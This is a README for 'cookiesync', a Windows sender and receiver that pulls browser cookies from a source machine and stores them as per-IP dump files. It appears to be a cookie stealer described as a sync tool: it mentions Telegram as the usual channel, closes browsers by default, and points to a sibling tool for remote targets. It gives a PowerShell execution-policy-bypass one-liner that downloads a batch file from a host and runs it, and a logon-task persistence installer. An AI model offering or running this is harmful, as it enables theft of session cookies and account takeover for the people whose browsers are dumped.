# cookiesync

LAN-only sender and receiver, no third party. Use this when both machines are on the
same network and you would rather not involve Telegram.

## Receiver (destination)

    receiver\start_receiver.bat
    receiver\install_autostart.bat

`install_autostart.bat` adds inbound firewall rules for TCP 8000 and UDP 50505 and
registers a logon task. Run it once, as the user, no admin needed.

## Sender (source)

    sender\run.bat --host 192.168.1.50

Or without cloning anything:

    powershell -NoP -Exec Bypass -c "iwr http://DEST_IP:8000/sender/fetch_and_run.bat -OutFile $env:TEMP\cs.bat; & $env:TEMP\cs.bat http://DEST_IP:8000"

Output lands in `dumps\<timestamp>_<source-ip>.json` on the receiver.

## Flags

| Flag | Meaning |
|---|---|
| `--host HOST` | Skip UDP discovery |
| `--port N` | Override port |
| `--token T` | Must match receiver |
| `--out FILE` | Local only |
| `--no-close-browsers` | Leave browsers open |
| `--list-hosts` | Show discovered receivers |

## Why cookiedrop is usually better

UDP broadcast dies on guest Wi-Fi, enterprise VLANs, and anything crossing a router.
If the two machines are in different buildings or different cities, use `cookiedrop`.
Discovery failure is the single most common support issue here.

## Troubleshooting

No receiver found: pass `--host`. 401: token set but not supplied. Port busy: change
`port` in `config.json` and rerun `install_autostart.bat`.